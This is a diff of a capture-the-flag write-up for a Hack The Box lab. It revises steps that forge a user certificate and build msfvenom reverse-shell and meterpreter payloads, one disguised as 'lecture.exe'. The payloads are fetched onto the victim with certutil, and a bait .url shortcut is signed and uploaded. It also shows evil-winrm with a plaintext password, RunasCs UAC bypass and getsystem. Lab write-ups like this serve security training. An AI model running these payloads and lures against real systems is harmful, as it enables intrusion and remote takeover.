@@ -784,7 +784,7 @@ Generate user key and certificate using the email and name of a user found in th
 ```console
 root@kali:~# openssl genpkey -algorithm ec -pkeyopt ec_paramgen_curve:P-384 -out george.key
 
-root@kali:~# openssl req -new -key george.key -subj "/O=HTB University/CN=Any Name" -out george.csr
+root@kali:~# openssl req -new -key george.key -subj "/emailAddress=george@university.htb/CN=george" -out george.csr
 
 root@kali:~# openssl x509 -req -in george.csr -CA rootCA.crt -CAkey rootCA.key -CAcreateserial -days 3650 -sha256 -out george.pem
 Certificate request self-signature ok
@@ -812,7 +812,7 @@ In the `Change Public Key` page: GPG is used to encrypt uploaded lectures and th
 
 Generate a GPG key
 
-```
+```console
 root@kali:~# gpg --gen-key
 gpg (GnuPG) 2.2.45; Copyright (C) 2024 g10 Code GmbH
 This is free software: you are free to change and redistribute it.
@@ -918,16 +918,18 @@ tcp                    LISTEN                   0                        128    
 #### 5.3.2. Generate a reverse shell executable that points to `LAB-2`
 
 ```console
-root@kali:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.99.12 LPORT=4444 -f exe -o /var/www/html/reverse.exe
+root@kali:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.99.12 LPORT=4444 -f exe -o /var/www/html/lecture.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x64 from the payload
 No encoder specified, outputting raw payload
 Payload size: 460 bytes
 Final size of exe file: 7168 bytes
-Saved as: /var/www/html/reverse.exe
+Saved as: /var/www/html/lecture.exe
 ```
 
 #### 5.3.3. Place the payload with the user-level access that `wao` has on `WS-3`
+
+Connect to `WS-23` with `wao`: `proxychains -q evil-winrm -u 'WAO' -p 'WebAO1337' -i 192.168.99.2`
 
 Stage a directory to place the payload where other users can read
 
@@ -951,13 +953,13 @@ Successfully processed 1 files; Failed processing 0 files
 Download the payload to the directory
 
 ```pwsh
-PS C:\Users\wao\Documents> certutil.exe -urlcache -f -split http://192.168.99.12:8080/reverse.exe C:\temp\reverse.exe
+PS C:\Users\wao\Documents> certutil.exe -urlcache -f -split http://192.168.99.12:8080/lecture.exe C:\temp\lecture.exe
 ****  Online  ****
   0000  ...
   1c00
 CertUtil: -URLCache command completed successfully.
-PS C:\Users\wao\Documents> icacls C:\temp\reverse.exe
-C:\temp\reverse.exe Everyone:(I)(F)
+PS C:\Users\wao\Documents> icacls C:\temp\lecture.exe
+C:\temp\lecture.exe Everyone:(I)(F)
                     NT AUTHORITY\SYSTEM:(I)(F)
                     BUILTIN\Administrators:(I)(F)
                     BUILTIN\Users:(I)(RX)
@@ -980,7 +982,7 @@ Create the bait `lecture.url`:
 ```sh
 cat << EOF > lecture.url
 [InternetShortcut]
-URL=file:///C:/temp/reverse.exe
+URL=file:///C:/temp/lecture.exe
 IDList=
 EOF
 ```
@@ -998,7 +1000,7 @@ Sign the zip:
 gpg -u george --detach-sign lecture.zip
 ```
 
-Upload `` and `` to the university site:
+Upload `lecture.zip` and `lecture.zip.sig` to the university site:
 
 ![image](https://github.com/user-attachments/assets/9d3ea654-1905-4eeb-888a-3e48dd2b0814)
 
@@ -1093,23 +1095,21 @@ type C:\Users\Martin.T\Desktop\user.txt
 
 ## 6. Privilege escalation
 
-Stage meterpreter listener
+### 6.1. Create meterpreter payload
 
 ```console
-root@kali:~# msfconsole
-Metasploit tip: The use command supports fuzzy searching to try and
-select the intended module, e.g. use kerberos/get_ticket or use
-kerberos forge silver ticket
-⋮
-                      Metasploit
+root@kali:~# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.99.12 LPORT=4445 -f exe -o /var/www/html/connect.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of exe file: 7168 bytes
+Saved as: /var/www/html/connect.exe
+```
 
-       =[ metasploit v6.4.38-dev                          ]
-+ -- --=[ 2466 exploits - 1273 auxiliary - 393 post       ]
-+ -- --=[ 1475 payloads - 49 encoders - 13 nops           ]
-+ -- --=[ 9 evasion                                       ]
+### 6.2. Stage meterpreter listener
 
-Metasploit Documentation: https://docs.metasploit.com/
-
+```sh
 msf6 > use exploit/multi/handler
 [*] Using configured payload generic/shell_reverse_tcp
 msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
@@ -1146,19 +1146,7 @@ msf6 exploit(multi/handler) > exploit -j
 [*] Started reverse TCP handler on 0.0.0.0:4445
 ```
 
-Create meterpreter payload:
-
-```console
-root@kali:~# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.99.12 LPORT=4445 -f exe -o /var/www/html/reverse4445.exe
-[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
-[-] No arch selected, selecting arch: x64 from the payload
-No encoder specified, outputting raw payload
-Payload size: 510 bytes
-Final size of exe file: 7168 bytes
-Saved as: /var/www/html/reverse4445.exe
-```
-
-Prepare RunasCs in Kali:
+### 6.3. Prepare RunasCs in Kali:
 
 ```sh
 VERSION=$(curl -sI https://github.com/antonioCoco/RunasCs/releases/latest | grep location: | cut -d / -f 8 | tr -d '\r' | tr -d 'v')
@@ -1167,19 +1155,51 @@ unzip RunasCs.zip
 mv RunasCs.exe /var/www/html
 ```
 
-Try to RunasCs with `wao`:
+### 6.4. Execute
 
 ``` cmd
 C:\Windows\system32>cd C:\temp
 cd C:\temp
 
-C:\temp>certutil.exe -urlcache -f -split http://192.168.99.12:8080/reverse4445.exe
-certutil.exe -urlcache -f -split http://192.168.99.12:8080/reverse4445.exe
+C:\temp>certutil.exe -urlcache -f -split http://192.168.99.12:8080/RunasCs.exe
+certutil.exe -urlcache -f -split http://192.168.99.12:8080/RunasCs.exe
+****  Online  ****
+  0000  ...
+  ca00
+CertUtil: -URLCache command completed successfully.
+
+C:\temp>certutil.exe -urlcache -f -split http://192.168.99.12:8080/connect.exe
+certutil.exe -urlcache -f -split http://192.168.99.12:8080/connect.exe
 ****  Online  ****
   0000  ...
   1c00
 CertUtil: -URLCache command completed successfully.
 
-C:\temp>.\RunasCs.exe --bypass-uac reverse4445
-.\RunasCs.exe --bypass-uac -r 192.168.99.12:4445 .\reverse4445.exe
+C:\temp>.\RunasCs.exe --bypass-uac -l 5 wao WebAO1337 connect.exe
+.\RunasCs.exe --bypass-uac -l 5 wao WebAO1337 reverse4445
+[-] RunasCsException: Selected logon type '5' is not granted to the user 'wao'. Use available logon type '2'.
+C:\temp>.\RunasCs.exe --bypass-uac wao WebAO1337 connect.exe
+.\RunasCs.exe --bypass-uac wao WebAO1337 connect.exe
+```
+
+```sh
+[*] Sending stage (203846 bytes) to 10.10.11.39
+[*] Meterpreter session 1 opened (10.10.14.35:4445 -> 10.10.11.39:63053) at 2024-12-29 09:27:53 +0800
+
+msf6 exploit(multi/handler) > sessions 1
+[*] Starting interaction with 1...
+
+meterpreter > getprivs
+
+Enabled Process Privileges
+==========================
+
+Name
+----
+SeChangeNotifyPrivilege
+SeIncreaseWorkingSetPrivilege
+
+meterpreter > getsystem
+
+[*] fe80::349:6988:18c6:65c6 - Meterpreter session 1 closed.  Reason: Died
 ```
